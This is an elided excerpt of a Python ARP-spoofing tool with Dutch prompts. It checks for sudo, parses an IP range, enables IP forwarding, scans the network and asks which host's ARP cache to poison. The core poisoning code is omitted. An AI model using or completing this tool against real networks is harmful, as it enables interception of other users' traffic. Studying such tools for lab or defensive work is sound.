...
def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("Probeer dit programma met sudo uit te voeren.")
        exit()
...
def print_arp_res(arp_res):
    ...
    while True:
        try:
            choice = int(input("Selecteer het ID van de computer waarvan je de ARP-cache wilt vergiftigen (ctrl+z om te stoppen): "))
            if arp_res[choice]:
                return choice
        except:
...
def get_cmd_arguments():
    ...
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
        print("-ip_range vlag niet gespecificeerd.")
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            print(f"{IPv4Network(sys.argv[2])}")
            ip_range = sys.argv[2]
            print("Geldig IP-bereik opgegeven via de opdrachtregel.")
        except:
            print("Ongeldige opdrachtregelparameter opgegeven.")
...
if ip_range == None:
    print("Geen geldig IP-bereik opgegeven. Afsluiten!")
    exit()

allow_ip_forwarding()
arp_res = arp_scan(ip_range)
if len(arp_res) == 0:
    print("Geen verbinding. Afsluiten, zorg ervoor dat apparaten actief zijn of zijn ingeschakeld.")
    exit()
...
if len(client_info) == 0:
    print("Geen clients gevonden bij het verzenden van de ARP-berichten. Afsluiten, zorg ervoor dat apparaten actief zijn of zijn ingeschakeld.")
    exit()
